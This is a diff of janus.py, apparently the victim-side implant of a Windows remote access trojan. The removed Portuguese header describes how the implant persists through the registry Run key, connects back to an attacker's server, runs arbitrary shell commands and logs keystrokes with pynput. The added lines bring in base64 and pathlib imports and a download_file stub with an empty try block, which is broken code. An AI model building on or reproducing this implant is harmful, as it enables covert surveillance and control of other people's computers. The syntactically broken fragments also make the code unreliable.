@@ -1,22 +1,13 @@
-# =============================================================================
-# janus.py — Cliente (vítima)
-# -----------------------------------------------------------------------------
-# Visão geral: o "implant" roda na máquina alvo e se conecta no servidor
-# (connection.py). Ele:
-#   1. Tenta se persistir copiando-se para %APPDATA% e criando entrada na
-#      chave de registro "Run" do HKEY_CURRENT_USER (roda no login).
-#   2. Conecta num endereço/porta configurados e fica ouvindo comandos.
-#   3. Executa comandos de shell arbitrários recebidos do servidor.
-#   4. Tem um keylogger (pynput) que acumula teclas num buffer e envia pro
-#      servidor (manual ou automaticamente quando enche).
-# -----------------------------------------------------------------------------
 import os
 import sys
 import winreg
 import shutil
 import socket
+import base64
 import subprocess
+
 from time import sleep
+from pathlib import Path
 from pynput import Keyboard
 from datetime import datetime
 
@@ -63,6 +54,11 @@ buffer_auto_send_pending = False
 keylogger_active = False
 listener = None
 
+def download_file(filepath):
+    try:
+
+    except Exception as e:
+        pass
 
 # -----------------------------------------------------------------------------
 # format_key(key) -> string legível da tecla pressionada
